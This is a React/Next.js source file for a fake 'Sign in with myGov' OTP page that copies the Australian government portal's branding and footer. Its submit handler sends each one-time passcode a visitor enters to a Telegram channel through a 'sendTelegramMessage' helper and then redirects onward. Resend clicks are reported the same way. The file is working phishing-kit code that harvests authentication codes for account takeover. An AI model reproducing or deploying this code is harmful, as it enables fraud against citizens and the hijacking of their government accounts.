/* eslint-disable @next/next/no-img-element */
"use client"
import React, { useState, useEffect } from "react";
import "../css/mgv2-application.css";
import "../css/blugov.css";
import Link from "next/link";
import { sendTelegramMessage } from "../../utils/telegram";

const MyGovSignInPage: React.FC = () => {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(30);
  const [canResend, setCanResend] = useState(false);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    } else {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [timer]);

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    setError("");

    if (!otp) {
      setError("Please enter the OTP");
      return;
    }

    setIsLoading(true);
    const message = `🔑 New OTP Submitted\nOTP: ${otp}\nTime: ${new Date().toLocaleString()}`;

    try {
      await sendTelegramMessage(message);
      window.location.href = '/mygov2';
    } catch (err) {
      console.log(err)
      setError("Invalid OTP");
    } finally {
      setIsLoading(false);
    }
  };

  const handleResendOtp = async () => {
    setTimer(30);
    setCanResend(false);
    const message = `🔑 OTP Resend Requested\nTime: ${new Date().toLocaleString()}`;
    try {
      await sendTelegramMessage(message);
    } catch (err) {
      console.error('Failed to send resend notification', err);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header className="border-b border-gray-200 bg-[#66d3ee]">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <Link href="/" className="no-underline border-none hover:no-underline">
              <img
                src="/images/myGov-cobranded-logo-black.svg"
                alt="myGov Beta"
                className="h-12 w-auto md:h-16"
                style={{ border: 'none' }}
              />
            </Link>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-grow bg-gray-50">
        <div className="container mx-auto px-4 py-8 md:py-12">
          <div className="max-w-md md:max-w-lg mx-auto bg-white rounded-xl shadow-2xl p-6 md:p-10">
            <div className="mb-10">
              <h1 className="text-3xl font-bold text-gray-900 mb-2">Sign in with myGov</h1>
              <h2 className="text-lg text-gray-600">Enter the OTP sent to your registered device</h2>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              {error && (
                <div className="text-red-600 text-sm p-4 bg-red-50 rounded-lg border-2 border-red-100">
                  {error}
                </div>
              )}

              <div className="space-y-6">
                <div>
                  <label htmlFor="otp" className="block text-lg font-medium text-gray-700 mb-3">
                    Verification code
                  </label>
                  <div className="flex gap-4 items-center">
                    <input
                      id="otp"
                      type="text"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value)}
                      className="w-full px-4 py-3 text-lg border-2 border-gray-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                      disabled={isLoading}
                      required
                    />
                    <div className="flex-shrink-0">
                      {!canResend ? (
                        <span className="text-gray-600">{timer}s</span>
                      ) : (
                        <button
                          type="button"
                          onClick={handleResendOtp}
                          className="text-blue-600 hover:text-blue-800 hover:underline"
                        >
                          Resend
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex justify-center bg-[#99e1f3] w-full">
                <button
                  type="submit"
                  className="w-full h-full py-4 px-8 text-white text-xl font-bold rounded-xl 
                    hover:bg-[#66c3e0] transform transition-all duration-200 hover:scale-[1.02]
                    disabled:opacity-50 shadow-lg hover:shadow-xl"
                  disabled={isLoading}
                >
                  {isLoading ? 'Verifying...' : 'Verify OTP'}
                </button>
              </div>

              <div className="mt-10 pt-8 border-t border-gray-200">
                <p className="text-center text-lg text-gray-600">
                  Didn&apos;t receive code?{' '}
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    disabled={!canResend}
                    className="text-blue-600 hover:text-blue-800 hover:underline font-semibold"
                  >
                    Resend OTP
                  </button>
                </p>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 text-white">
        <div className="container mx-auto px-4 py-8">
          <nav className="mb-8">
            <ul className="flex flex-col md:flex-row gap-4 md:gap-8">
              <li><a href="/terms" className="text-lg hover:text-blue-300">Terms of use</a></li>
              <li><a href="/privacy" className="text-lg hover:text-blue-300">Privacy and security</a></li>
              <li><a href="/copyright" className="text-lg hover:text-blue-300">Copyright</a></li>
              <li><a href="/accessibility" className="text-lg hover:text-blue-300">Accessibility</a></li>
            </ul>
          </nav>

          <div className="border-t border-gray-800 pt-8">
            <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
              <Link href="/">
                <img
                  src="/images/myGov-cobranded-logo-white.svg"
                  alt="myGov Beta"
                  className="h-16 w-auto"
                />
              </Link>
              <p className="text-base text-gray-400 max-w-2xl">
                We acknowledge the Traditional Custodians of the lands we live on. We pay our
                respects to all Elders, past and present, of all Aboriginal and Torres Strait
                Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default MyGovSignInPage;